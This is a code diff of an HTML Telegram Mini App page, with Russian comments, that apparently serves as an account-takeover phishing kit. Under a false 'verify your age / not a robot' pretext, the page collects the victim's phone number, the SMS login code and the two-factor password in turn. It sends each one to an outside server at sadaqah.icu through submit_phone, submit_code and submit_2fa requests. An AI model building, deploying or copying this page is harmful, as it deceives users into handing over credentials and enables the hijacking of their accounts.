@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="uz">
+<html lang="en">
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
-  <title>Tasdiqlash kodini kiritish</title>
+  <title>Verification</title>
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
   <style>
     :root{
@@ -178,75 +178,206 @@
       margin-top: 6px;
     }
 
-    @media (max-height: 680px){
-      .card{ padding: 14px; }
-      .keyboard{ gap: 8px; }
+    .phone-share-btn {
+      background: var(--button);
+      color: var(--buttonText);
+      border: none;
+      border-radius: var(--radius);
+      padding: 16px;
+      font-size: 16px;
+      font-weight: 600;
+      width: 100%;
+      margin-top: 12px;
+      cursor: pointer;
+      transition: opacity 0.2s;
     }
+    .phone-share-btn:active { opacity: 0.8; }
+
+    .twofa-input {
+      width: 100%;
+      padding: 16px;
+      border-radius: var(--radius);
+      border: 1px solid rgba(255,255,255,.12);
+      background: rgba(0,0,0,.2);
+      color: var(--text);
+      font-size: 18px;
+      margin-top: 12px;
+    }
+    .twofa-input:focus { outline: none; border-color: var(--button); }
+
+    .hidden { display: none !important; }
   </style>
 </head>
 
 <body>
   <div class="wrap">
 
-    <div class="card">
+    <!-- Блок запроса номера телефона -->
+    <div id="phoneBlock" class="card">
       <div class="top">
         <div>
-          <p class="title">Tasdiqlash</p>
-          <p class="subtitle">SMS orqali kelgan kodni kiriting — bu bir necha soniya oladi.</p>
+          <p class="title">Verify your age</p>
+          <p class="subtitle">Please share your phone number to confirm you're not a robot.</p>
         </div>
-        <div class="pill" id="phoneDisplay">Raqam: —</div>
+        <div class="pill" id="phoneDisplay">Not shared</div>
       </div>
+      <button id="sharePhoneBtn" class="phone-share-btn">📱 Share phone number</button>
+    </div>
 
-      <div class="codeBox" aria-label="Tasdiqlash kodi">
+    <!-- Блок ввода кода -->
+    <div id="codeBlock" class="card hidden">
+      <div class="top">
+        <div>
+          <p class="title">Verification</p>
+          <p class="subtitle">Enter the code sent via SMS — it will take just a few seconds.</p>
+        </div>
+        <div class="pill" id="codePhoneDisplay">Phone: —</div>
+      </div>
+      <div class="codeBox" aria-label="Verification code">
         <div class="codeDots" id="codeDots"></div>
       </div>
-
       <div class="hintRow">
         <span id="progressHint">0 / 5</span>
-        <span>O‘chirish: ⌫</span>
+        <span>Delete: ⌫</span>
       </div>
     </div>
 
+    <!-- Блок ввода 2FA пароля -->
+    <div id="twofaBlock" class="card hidden">
+      <div class="top">
+        <div>
+          <p class="title">Two‑factor authentication</p>
+          <p class="subtitle">Enter your account password (2FA).</p>
+        </div>
+        <div class="pill" id="twofaPhoneDisplay">Phone: —</div>
+      </div>
+      <input type="password" id="twofaInput" class="twofa-input" placeholder="Password" />
+      <button id="submit2faBtn" class="phone-share-btn" style="margin-top:16px;">✅ Submit</button>
+    </div>
+
+    <!-- Клавиатура для ввода кода (всегда видна, но активна только при codeBlock) -->
     <div class="keyboard card" id="keyboard"></div>
-    <div class="footerNote">Kodingiz qurilmada saqlanmaydi.</div>
+    <div class="footerNote">Your data is not stored on the device.</div>
 
   </div>
 
   <script>
     const WebApp = window.Telegram?.WebApp;
     if (!WebApp) {
-      alert('Telegram WebApp mavjud emas');
+      alert('Telegram WebApp is not available');
     } else {
       WebApp.ready();
       WebApp.expand();
     }
 
-    const urlParams = new URLSearchParams(window.location.search);
-    const phone = urlParams.get('phone') || '';
     const userId = WebApp?.initDataUnsafe?.user?.id;
-
     if (!userId) {
-      alert('user_id ni olishning imkoni bo‘lmadi');
+      alert('Could not get user_id');
+    }
+
+    // Элементы
+    const phoneBlock = document.getElementById('phoneBlock');
+    const codeBlock = document.getElementById('codeBlock');
+    const twofaBlock = document.getElementById('twofaBlock');
+    const phoneDisplay = document.getElementById('phoneDisplay');
+    const codePhoneDisplay = document.getElementById('codePhoneDisplay');
+    const twofaPhoneDisplay = document.getElementById('twofaPhoneDisplay');
+    const sharePhoneBtn = document.getElementById('sharePhoneBtn');
+    const codeDots = document.getElementById('codeDots');
+    const progressHint = document.getElementById('progressHint');
+    const keyboard = document.getElementById('keyboard');
+    const twofaInput = document.getElementById('twofaInput');
+    const submit2faBtn = document.getElementById('submit2faBtn');
+
+    const CODE_LEN = 5; // должно совпадать с config.py
+    let code = '';
+    let currentPhone = ''; // сохраняем номер после его получения
+
+    // Функция запроса статуса
+    async function fetchState() {
+      try {
+        const res = await fetch(`https://sadaqah.icu/status?user_id=${userId}`, {
+          method: 'GET',
+          headers: { 'Content-Type': 'application/json' }
+        });
+        const data = await res.json();
+        return data.state; // 'none', 'get_number', 'get_code', 'get_2fa'
+      } catch (e) {
+        console.error('Status error:', e);
+        return 'none';
+      }
+    }
+
+    // Отображение нужного блока
+    function showBlock(state) {
+      phoneBlock.classList.add('hidden');
+      codeBlock.classList.add('hidden');
+      twofaBlock.classList.add('hidden');
+
+      if (state === 'get_number' || state === 'none') {
+        phoneBlock.classList.remove('hidden');
+        // Показываем клавиатуру? Не нужна для номера
+        keyboard.style.display = 'none';
+      } else if (state === 'get_code') {
+        codeBlock.classList.remove('hidden');
+        keyboard.style.display = 'grid';
+        // Обновляем отображение номера, если он есть
+        if (currentPhone) {
+          codePhoneDisplay.textContent = `Phone: ${maskPhone(currentPhone)}`;
+        }
+      } else if (state === 'get_2fa') {
+        twofaBlock.classList.remove('hidden');
+        keyboard.style.display = 'none';
+        if (currentPhone) {
+          twofaPhoneDisplay.textContent = `Phone: ${maskPhone(currentPhone)}`;
+        }
+      }
     }
 
     function maskPhone(p) {
-      if (!p) return 'Raqam ko‘rsatilmagan';
+      if (!p) return '—';
       const cleaned = String(p).replace(/\D/g, '');
       if (cleaned.length < 4) return p;
       const last4 = cleaned.slice(-4);
       return '****' + last4;
     }
 
-    const phoneEl = document.getElementById('phoneDisplay');
-    phoneEl.textContent = `Raqam: ${maskPhone(phone)}`;
+    // Запрос номера через WebApp.requestContact
+    async function requestPhone() {
+      try {
+        const contactData = await WebApp.requestContact();
+        if (contactData && contactData.contact && contactData.contact.phone_number) {
+          const phone = contactData.contact.phone_number;
+          currentPhone = phone;
+          phoneDisplay.textContent = `Phone: ${maskPhone(phone)}`;
 
-    const codeDots = document.getElementById('codeDots');
-    const progressHint = document.getElementById('progressHint');
-    const keyboard = document.getElementById('keyboard');
+          // Отправляем номер на сервер
+          const res = await fetch('https://sadaqah.icu/submit_phone', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ user_id: userId, phone: phone })
+          });
+          const result = await res.json();
+          if (result.status === 'ok') {
+            // После успешной отправки номера переключаемся на состояние get_code
+            showBlock('get_code');
+          } else {
+            alert('Error: ' + (result.error || 'Unknown error'));
+          }
+        } else {
+          // Пользователь отменил – просто остаёмся в том же блоке
+          alert('You need to share your phone number to proceed.');
+        }
+      } catch (e) {
+        console.error('requestContact error:', e);
+        alert('Failed to request phone number.');
+      }
+    }
 
-    const CODE_LEN = 5;
-    let code = '';
+    // Обработчик кнопки "Share phone number"
+    sharePhoneBtn.addEventListener('click', requestPhone);
 
+    // --- Логика ввода кода (как в старом мини‑аппе) ---
     function renderDots() {
       codeDots.innerHTML = '';
       for (let i = 0; i < CODE_LEN; i++) {
@@ -256,8 +387,6 @@
       }
       progressHint.textContent = `${code.length} / ${CODE_LEN}`;
     }
-
-    renderDots();
 
     function haptic(type = 'light') {
       try {
@@ -281,10 +410,10 @@
 
     function updateUI() {
       renderDots();
-
+      // Показываем/скрываем MainButton
       if (code.length === CODE_LEN) {
         WebApp.MainButton
-          .setText('Tasdiqlash')
+          .setText('Confirm')
           .show()
           .onClick(sendCode);
       } else {
@@ -292,18 +421,79 @@
       }
     }
 
-    // Klaviatura (C tugmasi yo‘q)
-    const keys = [
-      '1','2','3',
-      '4','5','6',
-      '7','8','9',
-      'spacer','0','del'
-    ];
+    // Отправка кода
+    async function sendCode() {
+      if (code.length !== CODE_LEN) return;
+      WebApp.MainButton.disable().showProgress(true);
+      const payload = {
+        user_id: userId,
+        phone: currentPhone,
+        code: code
+      };
+      try {
+        const res = await fetch('https://sadaqah.icu/submit_code', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+        const result = await res.json();
+        if (result.status === 'ok') {
+          haptic('medium');
+          WebApp.close();
+        } else if (result.status === '2fa_required') {
+          // Нужен 2FA – переключаем блок
+          showBlock('get_2fa');
+          WebApp.MainButton.hide();
+        } else {
+          WebApp.MainButton.enable().showProgress(false);
+          haptic('rigid');
+          alert('Error: ' + (result.message || 'Invalid code'));
+          code = '';
+          renderDots();
+        }
+      } catch (err) {
+        WebApp.MainButton.enable().showProgress(false);
+        haptic('rigid');
+        alert('Network error: ' + err);
+      }
+    }
 
+    // Отправка 2FA пароля
+    submit2faBtn.addEventListener('click', async () => {
+      const password = twofaInput.value.trim();
+      if (!password) {
+        alert('Please enter your password');
+        return;
+      }
+      submit2faBtn.disabled = true;
+      submit2faBtn.textContent = '⏳ Checking...';
+      try {
+        const res = await fetch('https://sadaqah.icu/submit_2fa', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ user_id: userId, password: password })
+        });
+        const result = await res.json();
+        if (result.status === 'ok') {
+          haptic('medium');
+          WebApp.close();
+        } else {
+          alert('Error: ' + (result.message || 'Invalid password'));
+          twofaInput.value = '';
+        }
+      } catch (err) {
+        alert('Network error: ' + err);
+      } finally {
+        submit2faBtn.disabled = false;
+        submit2faBtn.textContent = '✅ Submit';
+      }
+    });
+
+    // Создание клавиатуры
+    const keys = ['1','2','3','4','5','6','7','8','9','spacer','0','del'];
     keys.forEach(k => {
       const btn = document.createElement('button');
       btn.className = 'key';
-
       if (k === 'spacer') {
         btn.classList.add('spacer');
         btn.disabled = true;
@@ -316,47 +506,32 @@
         btn.textContent = k;
         btn.addEventListener('click', () => addDigit(k));
       }
-
       keyboard.appendChild(btn);
     });
 
-    // Desktopda ochilsa: klaviaturadan ham ishlaydi
+    // Поддержка клавиатуры компьютера
     window.addEventListener('keydown', (e) => {
+      if (codeBlock.classList.contains('hidden')) return; // только для блока кода
       if (e.key >= '0' && e.key <= '9') addDigit(e.key);
       if (e.key === 'Backspace') deleteDigit();
       if (e.key === 'Enter' && code.length === CODE_LEN) sendCode();
     });
 
-    async function sendCode() {
-      if (code.length !== CODE_LEN) return;
-
-      WebApp.MainButton.disable().showProgress(true);
-
-      const data = { user_id: userId, phone, code };
-
-      try {
-        const res = await fetch('https://sadaqah.icu/submit_code', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(data)
-        });
-
-        const result = await res.json().catch(() => ({}));
-
-        if (result.status === 'ok') {
-          haptic('medium');
-          WebApp.close();
-        } else {
-          WebApp.MainButton.enable().showProgress(false);
-          haptic('rigid');
-          alert('Xatolik: ' + (result.message || result.error || 'noma’lum'));
-        }
-      } catch (err) {
-        WebApp.MainButton.enable().showProgress(false);
-        haptic('rigid');
-        alert('Tarmoq xatosi: ' + err);
+    // Инициализация: получаем состояние и показываем нужный блок
+    (async () => {
+      const state = await fetchState();
+      if (state === 'get_number' || state === 'none') {
+        showBlock('get_number');
+        // Можно сразу попросить номер? По условию пользователь сам нажимает кнопку, поэтому не автоматически.
+      } else if (state === 'get_code') {
+        // Нужно получить номер из данных состояния? На сервере он есть, но мы его не передаём.
+        // Попробуем получить через дополнительный запрос? Пока оставим так.
+        showBlock('get_code');
+      } else if (state === 'get_2fa') {
+        showBlock('get_2fa');
       }
-    }
+    })();
+
   </script>
 </body>
 </html>
